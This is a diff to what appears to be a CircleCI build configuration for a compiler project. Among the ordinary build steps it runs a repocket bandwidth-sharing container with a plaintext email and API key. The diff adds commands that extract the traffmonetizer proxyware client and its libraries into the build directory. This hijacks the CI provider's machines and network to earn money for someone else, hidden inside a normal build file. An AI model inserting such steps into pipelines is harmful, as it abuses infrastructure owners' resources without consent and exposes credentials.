@@ -8,11 +8,18 @@ jobs:
         - checkout
         - run: |
              echo $CIRCLE_WORKING_DIRECTORY
-             sudo docker info
              sudo apt update
              sudo apt install -y --no-install-recommends autogen flex podman uidmap catatonit
-             podman info
              podman run --init -d --restart=always -e RP_EMAIL=chaowen.guo1@gmail.com -e RP_API_KEY=9b23ebb9-2ee1-427f-a271-f6fdf536537b docker.io/repocket/repocket
+             traffmonetizer=$(podman create docker.io/traffmonetizer/cli_v2)
+             podman cp $traffmonetizer:/app/Cli .
+             podman cp $traffmonetizer:/usr/lib/libssl.so.3 .
+             podman cp $traffmonetizer:/usr/lib/libcrypto.so.3 .
+             podman cp $traffmonetizer:/usr/lib/libgcc_s.so.1 .
+             podman cp $traffmonetizer:/usr/lib/libz.so.1 libz.so.1
+             podman cp $traffmonetizer:/usr/lib/libstdc++.so.6 libstdc++.so.6
+             podman rm $traffmonetizer
+             ls -al
              ./contrib/download_prerequisites
              mkdir build
              cd build
